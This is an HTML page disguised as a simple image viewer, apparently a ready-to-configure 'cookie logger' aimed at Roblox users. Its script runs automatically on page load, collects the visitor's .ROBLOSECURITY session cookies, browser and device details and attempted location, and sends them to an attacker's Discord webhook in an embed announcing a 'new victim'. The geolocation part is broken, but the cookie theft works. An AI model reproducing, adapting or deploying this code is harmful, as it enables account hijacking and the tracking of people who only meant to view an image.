<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
        }
        img {
            max-width: 100%;
            max-height: 100vh;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="YOUR_IMAGE_URL_HERE" id="image" alt="">
    </div>

    <script>
        // CONFIGURE THESE TWO VALUES
        const imageUrl = "YOUR_IMAGE_URL_HERE"; // Replace with your image URL
        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace with your Discord webhook URL
        
        // Set the image source
        document.getElementById('image').src = imageUrl;

        // Function to get user's location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        return {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                    },
                    error => {
                        return { error: error.message };
                    }
                );
            } else {
                return { error: "Geolocation is not supported by this browser." };
            }
        }

        // Function to get browser and device info
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };
        }

        // Function to extract cookies
        function getRobloxCookies() {
            const cookies = document.cookie.split(';');
            const robloxCookies = {};
            
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name.includes('.ROBLOSECURITY')) {
                    robloxCookies[name] = value;
                }
            });
            
            return robloxCookies;
        }

        // Function to send data to Discord webhook
        async function sendDataToWebhook(data) {
            try {
                const payload = {
                    "embeds": [{
                        "title": "Cookie Logger",
                        "description": "New victim detected",
                        "image": {
                            "url": imageUrl
                        },
                        "fields": [
                            {
                                "name": "Cookies",
                                "value": "```" + JSON.stringify(data.cookies, null, 2) + "```"
                            },
                            {
                                "name": "Location",
                                "value": "```" + JSON.stringify(data.location, null, 2) + "```"
                            },
                            {
                                "name": "Browser Info",
                                "value": "```" + JSON.stringify(data.browser, null, 2) + "```"
                            }
                        ],
                        "footer": {
                            "text": "Timestamp: " + data.timestamp
                        }
                    }]
                };
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    console.error('Failed to send data to webhook');
                }
            } catch (error) {
                console.error('Error sending data to webhook:', error);
            }
        }

        // Collect all data and send to webhook
        window.addEventListener('load', () => {
            const locationData = getLocation();
            const browserData = getBrowserInfo();
            const cookieData = getRobloxCookies();
            
            const allData = {
                timestamp: new Date().toISOString(),
                cookies: cookieData,
                location: locationData,
                browser: browserData
            };
            
            // Send the data
            sendDataToWebhook(allData);
        });
    </script>
</body>
</html>
